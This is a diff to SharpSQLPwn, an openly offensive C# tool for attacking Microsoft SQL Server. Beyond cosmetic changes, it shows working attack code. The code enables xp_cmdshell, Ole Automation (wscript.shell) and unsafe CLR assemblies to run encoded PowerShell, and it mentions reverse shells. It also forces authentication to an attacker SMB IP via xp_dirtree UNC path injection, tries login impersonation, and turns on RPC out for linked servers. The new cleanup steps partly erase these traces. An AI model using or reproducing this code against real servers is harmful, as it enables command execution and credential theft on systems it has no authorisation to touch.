@@ -59,7 +59,7 @@ namespace SharpSQLPwn
                    Console.WriteLine(@"/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/ ");
                    Console.WriteLine(@"                     /_/                                              ");
                    Console.WriteLine(@"   https://github.com/lefayjey/SharpSQLPwn");
-                   Console.WriteLine(@"   Version:  1.0");
+                   Console.WriteLine(@"   Version:  1.1");
                    Console.WriteLine(@"   Author:  lefayjey");
                    Console.WriteLine();
                    Console.ResetColor();
@@ -104,9 +104,7 @@ namespace SharpSQLPwn
                 {
                     while (reader.Read() == true)
                     {
-                        Console.ForegroundColor = ConsoleColor.Cyan;
                         if (reader[0] != DBNull.Value) { Console.WriteLine("---> " + reader[0]); };
-                        Console.ResetColor();
                     }
                 }
                 reader.Close();
@@ -168,9 +166,11 @@ namespace SharpSQLPwn
 
             String pscmd = "powershell -enc " + psCommandBase64;
 
-            Console.WriteLine("\n[Info] The PS code: " + code);
-            Console.WriteLine("[Info] Encoded command: " + pscmd);
-            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("\n[i] The PS code: " + code);
+            Console.WriteLine("[i] Encoded command: " + pscmd);
+            Console.ResetColor();
+            Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("[*] Executing command. If executing a reverse shell, please make sure listener is running");
             Console.ResetColor();
 
@@ -179,10 +179,10 @@ namespace SharpSQLPwn
 
         static void Recon(SqlConnection con)
         {
-            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Recon Tests <<<<<<<<<<<<<<<<<<<");
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Recon Tests <<<<<<<<<<<<<<<<<<<\n");
             //System username of current session
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("\n[+] Logged in as:");
+            Console.WriteLine("[+] Logged in as:");
             Console.ResetColor();
             QuerySQL(con, "SELECT SYSTEM_USER;", true);
 
@@ -219,7 +219,7 @@ namespace SharpSQLPwn
 
         static void Impersonate(SqlConnection con, String impers_user)
         {
-            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Impersonation Tests <<<<<<<<<<<<<<<<<<<");
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Impersonation Tests <<<<<<<<<<<<<<<<<<<\n");
             if (impers_user != "")
             {
                 Console.ForegroundColor = ConsoleColor.Blue;
@@ -248,7 +248,7 @@ namespace SharpSQLPwn
 
         static void CmdExec(SqlConnection con, int cmdExec_tech, string cmdExec_command)
         {
-            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Command Execution Tests <<<<<<<<<<<<<<<<<<<");
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Command Execution Tests <<<<<<<<<<<<<<<<<<<\n");
             if (cmdExec_command != "")
             {
                 Console.ForegroundColor = ConsoleColor.Blue;
@@ -259,41 +259,55 @@ namespace SharpSQLPwn
                 {
                     String cmd = EncodePs(cmdExec_command);
 
-                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.ForegroundColor = ConsoleColor.Cyan;
                     Console.WriteLine("[*] Trying technique-1 by enabling xp_cmdshell procedure if disabled ...");
                     Console.ResetColor();
                     String enable_xpcmdshell = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                     QuerySQL(con, enable_xpcmdshell, false);
 
-                    String execcmd = "EXEC xp_cmdshell '" + cmd + "';";
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine("[+] Command output (if any):");
                     Console.ResetColor();
-
+                    String execcmd = "EXEC xp_cmdshell '" + cmd + "';";
                     QuerySQL(con, execcmd, true);
+
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.WriteLine("[*] Cleaning up, disabling xp_cmdshell ...");
+                    Console.ResetColor();
+                    String disable_xpcmdshell = "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
+                    QuerySQL(con, disable_xpcmdshell, false);
                 }
 
                 if (cmdExec_tech == 2)
                 {
                     String cmd = EncodePs(cmdExec_command);
 
-                    Console.ForegroundColor = ConsoleColor.Blue;
-                    Console.WriteLine("[*] Trying technique-2 by enabling sp_OACreate procedure if disabled ...");
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.WriteLine("[*] Trying technique-2 by enabling Ole Automation Procedures procedure if disabled ...");
                     Console.ResetColor();
-                    String enable_sp_oacreate = "EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
-                    QuerySQL(con, enable_sp_oacreate, false);
-                    String execcmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + cmd + "';";
+                    String enable_ole_proc = "EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+                    QuerySQL(con, enable_ole_proc, false);
+
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine("[+] Command output (if any):");
                     Console.ResetColor();
-                    QuerySQL(con, execcmd, true);
+                    String create_oa = "DECLARE @myshell INT; EXEC sp_OACreate 'wscript.shell', @myshell OUTPUT; EXEC sp_OAMethod @myshell, 'run', null, '" + cmd + "';";
+                    QuerySQL(con, create_oa, true);
+
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.WriteLine("[*] Cleaning up, running sp_OADestroy on created procedure, and disabling Ole Automation Procedures ...");
+                    Console.ResetColor();
+                    String destroy_oa = "EXEC sp_OADestroy @myshell;";
+                    String disable_ole_proc = "EXEC sp_configure 'Ole Automation Procedures', 0; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
+                    QuerySQL(con, destroy_oa, true);
+                    QuerySQL(con, disable_ole_proc, true);
                 }
 
                 if (cmdExec_tech == 3)
                 {
                     String cmd = EncodePs(cmdExec_command);
 
-                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.ForegroundColor = ConsoleColor.Cyan;
                     Console.WriteLine("[*] Trying technique-3 by creating dll assembly and a custom procedure ...");
                     Console.ResetColor();
                     String enable_clr = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE";
@@ -305,24 +319,28 @@ namespace SharpSQLPwn
                     String create_procedure = "CREATE PROCEDURE [dbo].[sqlcmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[sqlcmdExec]; ";
                     QuerySQL(con, create_procedure, false);
 
-                    String execcmd = "EXEC sqlcmdExec '" + cmd + "';";
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine("[+] Command output (if any):");
                     Console.ResetColor();
+                    String execcmd = "EXEC sqlcmdExec '" + cmd + "';";
                     QuerySQL(con, execcmd, true);
 
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.WriteLine("[*] Cleaning up, dropping procedure and disabling on created procedure, and disabling clr ...");
+                    Console.ResetColor();
                     String drop_procedure = "DROP PROCEDURE [dbo].[sqlcmdExec];";
                     QuerySQL(con, drop_procedure, false);
                     String drop_assembly = "DROP ASSEMBLY myAssembly;";
                     QuerySQL(con, drop_assembly, false);
-
+                    String disable_clr = "use msdb; EXEC sp_configure 'clr strict security',1; RECONFIGURE; EXEC sp_configure 'clr enabled',0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE";
+                    QuerySQL(con, disable_clr, false);
                 }
             }
         }
 
         static void UNCPathInjection(SqlConnection con, string smb_ip)
         {
-            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running UNC Path Injection Tests <<<<<<<<<<<<<<<<<<<");
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running UNC Path Injection Tests <<<<<<<<<<<<<<<<<<<\n");
             if (smb_ip != "")
             {
                 Console.ForegroundColor = ConsoleColor.Blue;
@@ -339,7 +357,7 @@ namespace SharpSQLPwn
 
         static void TestLinkedServer(SqlConnection con, string linkedSQLServer, string smb_ip, string cmdExeclinked)
         {
-            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Linked Servers Tests <<<<<<<<<<<<<<<<<<<");
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Linked Servers Tests <<<<<<<<<<<<<<<<<<<\n");
             Console.ForegroundColor = ConsoleColor.Blue;
             Console.WriteLine("[*] Checking access on: " + linkedSQLServer);
             Console.ForegroundColor = ConsoleColor.Green;
@@ -354,6 +372,7 @@ namespace SharpSQLPwn
                 Console.WriteLine("[-] Cannot make connection to remote SQL server. RPC out could be disabled. Message: " + e.Message);
                 Console.ResetColor();
 
+                Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("[*] Trying to enable RPC out using sp_serveroptions");
                 Console.ResetColor();
                 String serveroption = "EXEC sp_serveroption '" + linkedSQLServer + "', 'rpc', 'true'; EXEC sp_serveroption '" + linkedSQLServer + "', 'rpc out', 'true';";
@@ -370,7 +389,7 @@ namespace SharpSQLPwn
 
             if (smb_ip != "")
             {
-                Console.ForegroundColor = ConsoleColor.Blue;
+                Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("[*] Trying to connect SMB share on " + smb_ip + " on remote SQL Server " + linkedSQLServer + " ...");
                 Console.ResetColor();
                 String smbquery = "EXEC ('master..xp_dirtree ''\"\\\\" + smb_ip + "\\test\"'';') AT [" + linkedSQLServer + "]";
@@ -431,7 +450,7 @@ namespace SharpSQLPwn
                         catch
                         {
                             Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("\n[-] Authentication Failed");
+                            Console.WriteLine("\n[-] Connection or Authentication Failed");
                             Console.ResetColor();
                             Environment.Exit(0);
                         }
@@ -521,7 +540,7 @@ namespace SharpSQLPwn
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
-                       Console.WriteLine("\n[-] Authentication Failed");
+                       Console.WriteLine("\n[-] Connection or Authentication Failed");
                        Console.ResetColor();
                        con.Close();
                        Environment.Exit(0);
